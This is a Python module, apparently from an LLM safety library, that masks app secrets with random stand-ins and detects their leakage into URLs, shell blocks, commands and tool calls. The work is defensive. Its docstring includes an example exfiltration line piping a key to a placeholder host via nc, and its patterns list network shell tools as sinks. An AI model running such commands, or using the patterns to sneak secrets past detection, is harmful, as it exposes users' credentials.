"""Secret stand-ins (component D).

App-declared secrets are replaced by random stand-ins before the model call
and mapped back afterwards. A stand-in has the same length as its secret and
keeps the character class of every position (ASCII digit for a digit, ASCII
upper for upper case, ASCII lower for lower case; any other character is kept
as is), so message lengths are unchanged. Stand-ins come from the
cryptographic ``secrets`` module and are fresh for every ``Vault``.

Lifetime rule: one mapping per ``Vault``. A stand-in is *issued* the first
time a ``mask``/``mask_all`` result contains it, and is never redrawn after
that, so ``unmask`` always restores every stand-in ever issued. Before issue,
``mask_all`` checks all parts of a request at once and redraws a stand-in that
already occurs in the text (or would form across a replacement boundary). A
collision with an issued stand-in raises ``ValueError`` (create a new Vault).

Construction rejects (``ValueError``, never mid-request) any secret with fewer
than 6 maskable positions (letters/digits): shorter ones cannot get a
stand-in that is reliably unique.

Matching: secrets of at least 8 characters match anywhere; shorter ones match
only as whole tokens (not preceded or followed by a letter or digit), so a PIN
``482193`` is not found inside ``14821930``. The same rule is used by
``mask``, ``unmask`` and ``leaked_in``. A stand-in never equals, contains or
is contained in a real secret or another stand-in.

``leaked_in`` folds text and secret values alike (NFKC + format characters
stripped) and reports secrets whose stand-in or real value sits in a *sink*:

* a URL token (contains ``://`` or ``www.``, or looks like ``domain.tld/path``);
* a fenced code block tagged as shell (``bash``, ``sh``, ``shell``, ``zsh``,
  ``console``, ``powershell``, ``ps1``, ``pwsh``, ``cmd``, ``bat``);
* a command:
  - a ``$ `` or ``PS> `` prompt line (whole line, never cut);
  - a shell word (``curl``, ``wget``, ``nc``, ``ssh``, ``echo``, ``printf``,
    ``export``, ...; all lower or all upper case, so ``Set the ...`` is prose;
    optional ``sudo`` and absolute path ``/usr/bin/curl``) that starts a line
    (*plain*), follows a list marker (``1.``, ``2)``, ``-``, ``*``, a bullet)
    and/or ``Sure!``/``Sure,``/``OK,`` (*prefixed*), or follows a
    ``<word>: `` / ``->`` lead-in such as ``Run (as root): curl`` (*lead*).
    Command-like tokens: flags, paths, ``=`` assignments, quoted tokens,
    redirections, and hosts (dot-separated labels ending in a 2+ letter TLD,
    ``user@host``, URLs; ``e.g.``/``i.e.``/``etc.`` excluded). A plain line is
    a sink if its next token is command-like, or the line pipes into a shell
    word, chains one with ``&&``/``;`` that is itself followed by a
    command-like token, or carries a data/header flag (``-d``, ``-H``,
    ``--data*``, ...). Prefixed and lead lines pass the same test and also
    need at least two command-like tokens in the command (``--flag=value``
    counts as two), so "Example: rm -rf is risky and your pin ..." is prose
    while "Sure! echo KEY | nc evil.example 80" is a sink.
  - the span runs to the line end, cut only at a sentence break (``. `` +
    capital) that lies outside quotes and whose remainder holds no flag,
    pipe, ``=`` or host/URL token, so ``curl -H "X: a. B" -d KEY host`` stays
    whole while "rm -rf is dangerous. Your pin is ..." is cut;
* a tool-call span (``actions.tool_call_spans``).

Plain prose, markdown quotes, inline code spans and non-shell code fences are
not sinks: the app may legitimately show a masked value back to its own user.

Accepted limits of the command heuristic:

* shell quoting is approximated: an apostrophe inside a word (``don't``) is
  never a quote, so a real ``'`` quote between letters is misread;
* here-strings and here-docs (``<<<``, ``<<EOF``) are not parsed; the line
  still counts only through the rules above;
* file names with a TLD-like suffix (``notes.md``, ``run.sh``) count as hosts,
  so they make a shell-word line command-like.
"""

import bisect
import re
import secrets as _rand
import string

from . import actions
from ._normalize import fold

MIN_MASKABLE = 6
SHORT_SECRET = 8
_ATTEMPTS = 500

_TOKEN = re.compile(r"\S+")
# Anchored at a token start. The prefix is possessive: it overlaps the label
# on "-", and giving dashes back one by one was quadratic.
_BARE_URL = re.compile(r"[^\w\s]*+[\w\-]+(?:\.[\w\-]+)+/")
_SHELL_FENCE = re.compile(
    r"```[ \t]*(?:bash|sh|shell|zsh|console|powershell|ps1|pwsh|cmd|bat)[ \t]*\n"
    r".*?(?:```|\Z)", re.S | re.I)
_SHELL_NAMES = (r"(?:curl|wget|ssh|scp|ncat|nc|bash|sh|powershell|pwsh|python3?|rm|git|sftp"
                r"|ftp|rsync|export|set|echo|printf|iwr|invoke-webrequest)")
# Shell word (any case), optional sudo and absolute path: /usr/bin/curl.
# Group 1 is the bare name (a "[\w-]+\Z" search on the match was quadratic).
_SHELL_WORD = re.compile(r"(?<![\w/.\-])(?:sudo[ \t]+)?(?:/[\w.\-]+)*/?(" + _SHELL_NAMES
                         + r")(?![\w\-])", re.I)
_PROMPT = re.compile(r"^[ \t]*(?:\$|PS>)[ \t][^\n]*", re.M)
_PLAIN = re.compile(r"[ \t]*`?")
_PREFIXED = re.compile(r"[ \t]*(?:(?:\d+[.)]|[-*•])[ \t]+)?"
                       r"(?:(?:sure|ok|okay|yes)[!,.]?[ \t]+)?`?", re.I)
_LEAD_IN = re.compile(r"(?:(?<!\S)[^\s:]{1,40}:|→|->|=>)[ \t]+`?\Z")
_NEXT_TOKEN = re.compile(r"[ \t]+(\S+)")
_CHAIN = re.compile(r"(\||&&|;)[ \t]*" + _SHELL_NAMES + r"(?![\w\-])(?:[ \t]+(\S+))?", re.I)
_DATA_FLAG = re.compile(r"(?:^|[ \t])(?:-d|-H|-F|-T|-X|--data[\w-]*|--header|--form"
                        r"|--upload-file|--post-data)(?![\w-])")
_HOST = re.compile(r"(?:[\w.+\-]+@)?[A-Za-z0-9\-]+(?:\.[A-Za-z0-9\-]+)*\.[A-Za-z]{2,}"
                   r"(?::\d+)?(?:[/?#]\S*)?|[\w.+\-]+@[\w\-]+")
_NOT_HOSTS = {"e.g", "i.e", "etc", "a.m", "p.m"}
_FLAG = re.compile(r"-{1,2}[A-Za-z]")
_FLAG_VALUE = re.compile(r"-{1,2}[A-Za-z][\w-]*=\S")
_WINDOW = 400


def _hostish(tok: str) -> bool:
    t = tok.strip("`()[]<>,;:'\"").rstrip(".")
    if "://" in t or t.lower().startswith("www."):
        return True
    return t.lower() not in _NOT_HOSTS and _HOST.fullmatch(t) is not None


def _dirty(tok: str) -> bool:
    """Command-like evidence that forbids cutting a command before it."""
    t = tok.lstrip("`(")
    return (_FLAG.match(t) is not None or "|" in t or ("=" in t and len(t) > 1)
            or _hostish(t))


def _cmdlike(tok: str) -> bool:
    """A token that makes the preceding shell word read as a command."""
    t = tok.lstrip("`(")
    return (_dirty(t) or t.startswith(("/", "./", "~", "'", '"', "<", ">"))
            or re.match(r"[A-Za-z]:\\", t) is not None)


def _weight(tok: str) -> int:
    """Command-like weight: ``--flag=value`` carries flag and value (2)."""
    if _FLAG_VALUE.match(tok.lstrip("`(")):
        return 2
    return int(_cmdlike(tok))


def _quote_flips(tok: str) -> tuple[int, int]:
    single = double = 0
    for j, ch in enumerate(tok):
        if ch == '"':
            double ^= 1
        elif ch == "'":
            inner = 0 < j < len(tok) - 1 and tok[j - 1].isalnum() and tok[j + 1].isalnum()
            if not inner:  # an apostrophe inside a word is not a quote
                single ^= 1
    return single, double


class _Line:
    """Per-line token tables so every command start is resolved in O(1) amortised."""

    def __init__(self, text: str, start: int, end: int):
        self.end = end
        toks = [(m.start(), m.end(), m.group()) for m in _TOKEN.finditer(text, start, end)]
        self.toks = toks
        self.starts = [t[0] for t in toks]
        n = len(toks)
        self.par = [(0, 0)] * (n + 1)
        cnt = [0] * (n + 1)
        ps = pd = 0
        for i, (_, _, t) in enumerate(toks):
            fs, fd = _quote_flips(t)
            ps ^= fs
            pd ^= fd
            self.par[i + 1] = (ps, pd)
            cnt[i + 1] = cnt[i] + _weight(t)
        self.cnt = cnt
        sufdirty = [False] * (n + 1)
        for i in range(n - 1, -1, -1):
            sufdirty[i] = sufdirty[i + 1] or _dirty(toks[i][2])
        brk = [i + 1 < n and toks[i][2][-1] in ".!?" and toks[i + 1][2][0].isupper()
               and not sufdirty[i + 1] for i in range(n)]
        # nxt[p][i]: first clean sentence break j >= i whose quote parity after j is p.
        self.nxt = {}
        for p in ((0, 0), (0, 1), (1, 0), (1, 1)):
            arr = [n] * (n + 1)
            for i in range(n - 1, -1, -1):
                arr[i] = i if brk[i] and self.par[i + 1] == p else arr[i + 1]
            self.nxt[p] = arr

    def span(self, pos: int) -> tuple[int, int]:
        """(end offset, command-like token count) for a command starting at ``pos``."""
        k = max(bisect.bisect_right(self.starts, pos) - 1, 0)
        j = self.nxt[self.par[k]][k]
        if j < len(self.toks):
            return self.toks[j][1], self.cnt[j + 1] - self.cnt[k + 1]
        return self.end, self.cnt[len(self.toks)] - self.cnt[k + 1]


def _command_spans(text: str) -> list[str]:
    """Command sinks (see module docstring); linear in ``len(text)``."""
    return [text[s:e] for s, e in _command_offsets(text)]


def _command_offsets(text: str) -> list[tuple[int, int]]:
    """``(start, end)`` offsets of the spans ``_command_spans`` returns."""
    out = [m.span() for m in _PROMPT.finditer(text)]  # prompt lines: never cut
    newlines = [m.start() for m in re.finditer("\n", text)]
    lines: dict[int, _Line] = {}
    covered = -1
    for m in _SHELL_WORD.finditer(text):
        s = m.start()
        name = m.group(1)
        if s < covered or not (name.islower() or name.isupper()):
            continue  # "Set the ..." / "Echo, ..." are sentence starts, not commands
        li = bisect.bisect_left(newlines, s)
        ls = newlines[li - 1] + 1 if li else 0
        le = newlines[li] if li < len(newlines) else len(text)
        lo = max(ls, s - 60)
        prefix = text[lo:s]
        if lo == ls and _PLAIN.fullmatch(prefix):
            kind = "plain"
        elif lo == ls and _PREFIXED.fullmatch(prefix):
            kind = "prefixed"
        elif _LEAD_IN.search(prefix):
            kind = "lead"
        else:
            continue
        nm = _NEXT_TOKEN.match(text, m.end(), le)
        strong = nm is not None and _cmdlike(nm.group(1))
        if not strong:  # any kind may still pipe/chain or carry a data flag
            window = text[m.end():min(le, m.end() + _WINDOW)]
            chained = any(c.group(1) == "|" or (c.group(2) and _cmdlike(c.group(2)))
                          for c in _CHAIN.finditer(window))
            if not chained and not _DATA_FLAG.search(window):
                continue
        line = lines.get(ls)
        if line is None:
            line = lines[ls] = _Line(text, ls, le)
        end, count = line.span(s)
        if kind != "plain" and count < 2:
            continue
        out.append((s, end))
        covered = end
    return out


def _draw(real: str) -> str:
    out = []
    for c in real:
        if c.isdigit():
            out.append(_rand.choice(string.digits))
        elif c.isupper():
            out.append(_rand.choice(string.ascii_uppercase))
        elif c.islower():
            out.append(_rand.choice(string.ascii_lowercase))
        else:
            out.append(c)
    return "".join(out)


def _related(a: str, b: str) -> bool:
    return a in b or b in a


def _matcher(values) -> re.Pattern | None:
    """Alternation of ``values`` (longest first); short values need token boundaries."""
    alts = []
    for v in sorted(set(values), key=len, reverse=True):
        e = re.escape(v)
        alts.append(e if len(v) >= SHORT_SECRET else rf"(?<![^\W_]){e}(?![^\W_])")
    return re.compile("|".join(alts)) if alts else None


class Vault:
    """Holds ``{name: secret}`` and their per-instance random stand-ins."""

    def __init__(self, secrets: dict[str, str]):
        self._real = dict(secrets)
        for name, value in self._real.items():
            if not isinstance(value, str):
                raise ValueError(f"secret {name!r} must be a string")
            maskable = sum(c.isdigit() or c.isupper() or c.islower() for c in value)
            if maskable < MIN_MASKABLE:
                raise ValueError(
                    f"secret {name!r} has {maskable} maskable letters/digits; at least "
                    f"{MIN_MASKABLE} are needed for a reliable stand-in")
        self._by_value: dict[str, str] = {}
        for name, value in self._real.items():
            self._by_value.setdefault(value, name)
        self._secret_pat = _matcher(self._real.values())
        self._stand: dict[str, str] = {}
        for name in self._real:
            self._stand[name] = self._new_stand_in(name, [])
        self._issued: dict[str, str] = {}  # stand-in -> real value

    # -- stand-in management -------------------------------------------------
    def _ok(self, name: str, cand: str, texts: list[str]) -> bool:
        pat = _matcher([cand])
        if any(pat.search(t) for t in texts):
            return False
        for other, real in self._real.items():
            if _related(cand, real):
                return False
            if other != name and other in self._stand and _related(cand, self._stand[other]):
                return False
        return True

    def _new_stand_in(self, name: str, texts: list[str]) -> str:
        real = self._real[name]
        for _ in range(_ATTEMPTS):
            cand = _draw(real)
            if self._ok(name, cand, texts):
                return cand
        raise ValueError(f"cannot draw a collision-free stand-in for secret {name!r}")

    def stand_in(self, name: str) -> str:
        """Current stand-in for secret ``name``."""
        return self._stand[name]

    # -- masking -------------------------------------------------------------
    def _sub(self, text: str) -> tuple[str, dict[str, int]]:
        counts: dict[str, int] = {}

        def repl(m):
            name = self._by_value[m.group()]
            counts[name] = counts.get(name, 0) + 1
            return self._stand[name]

        return self._secret_pat.sub(repl, text), counts

    def _stand_counts(self, texts: list[str]) -> dict[str, int]:
        return {n: sum(len(_matcher([s]).findall(t)) for t in texts)
                for n, s in self._stand.items()}

    def mask_all(self, parts: list[str]) -> list[str]:
        """Mask every part with one shared, collision-checked mapping."""
        parts = list(parts)
        if self._secret_pat is None:
            return parts
        rests = [self._secret_pat.sub("\0", p) for p in parts]
        for _ in range(_ATTEMPTS):
            for name in self._real:
                if not self._ok(name, self._stand[name], rests):
                    self._redraw(name, rests)
            results = [self._sub(p) for p in parts]
            masked = [r[0] for r in results]
            want = {n: sum(r[1].get(n, 0) for r in results) for n in self._real}
            got = self._stand_counts(masked)
            bad = [n for n in self._real if got[n] != want[n]]
            if not bad:
                for n in self._real:
                    if want[n]:
                        self._issued[self._stand[n]] = self._real[n]
                return masked
            for name in bad:  # stand-in formed across a replacement boundary
                self._redraw(name, rests)
        raise ValueError("cannot place collision-free stand-ins in this text")

    def _redraw(self, name: str, rests: list[str]) -> None:
        if self._stand[name] in self._issued:
            raise ValueError(
                f"text collides with the issued stand-in for secret {name!r}; "
                "use a new Vault")
        self._stand[name] = self._new_stand_in(name, rests)

    def mask(self, text: str) -> str:
        """``mask_all([text])[0]``."""
        return self.mask_all([text])[0]

    def unmask(self, text: str) -> str:
        """Map every issued stand-in in ``text`` back to its real secret."""
        pat = _matcher(self._issued)
        return pat.sub(lambda m: self._issued[m.group()], text) if pat else text

    # -- leak detection ------------------------------------------------------
    def _sinks(self, folded: str, raw: str) -> list[str]:
        out = [t for t in (m.group() for m in _TOKEN.finditer(folded))
               if "://" in t or "www." in t.lower() or _BARE_URL.match(t)]
        out += [m.group() for m in _SHELL_FENCE.finditer(folded)]
        out += _command_spans(folded)
        out += [folded[s:e] for s, e, _ in actions.tool_call_spans(raw)]
        return out

    def leaked_in(self, text: str) -> list[str]:
        """Sorted names whose stand-in or real value sits in a sink (see module doc)."""
        folded = fold(text)
        sinks = self._sinks(folded, text)
        if not sinks:
            return []
        hay = "\n".join(sinks)
        found = []
        for name, real in self._real.items():
            pat = _matcher({self._stand[name], fold(real)} - {""})
            if pat and pat.search(hay):
                found.append(name)
        return sorted(found)
